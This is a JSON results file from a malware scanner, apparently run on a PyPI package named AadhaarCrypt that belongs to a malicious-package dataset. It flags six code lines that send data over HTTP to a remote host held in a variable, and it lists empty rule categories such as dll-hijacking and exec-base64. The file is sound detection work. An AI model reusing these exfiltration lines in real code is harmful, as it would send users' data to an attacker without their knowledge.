@@ -1,0 +1,49 @@
+{
+    "issues": 6,
+    "errors": {},
+    "results": {
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "AadhaarCrypt/__init__.py:73",
+                "code": "    r = urllib.request.urlopen(\"http://%s/p\" % http_domain, data=data_post.encode(), timeout=10)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "AadhaarCrypt/__init__.py:79",
+                "code": "    r = urllib.request.urlopen(\"http://%s/g?d=%s\" % (http_domain, data_get), timeout=10)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "AadhaarCrypt/__init__.py:85",
+                "code": "    r = requests.post(\"http://%s/p\" % http_domain, data=data_post, timeout=10)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "AadhaarCrypt/__init__.py:91",
+                "code": "    r = requests.get(\"http://%s/g?d=%s\" % (http_domain, data_get), timeout=10)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "AadhaarCrypt/__init__.py:97",
+                "code": "    r = urllib.urlopen(\"http://%s/p\" % http_domain, data=data_post)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "AadhaarCrypt/__init__.py:103",
+                "code": "    r = urllib.urlopen(\"http://%s/g?d=%s\" % (http_domain, data_get))\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "dll-hijacking": {},
+        "exec-base64": {},
+        "download-executable": {},
+        "cmd-overwrite": {},
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": {},
+        "obfuscation": {},
+        "shady-links": {}
+    },
+    "path": "./dataset/pypi/AadhaarCrypt-1.0"
+}
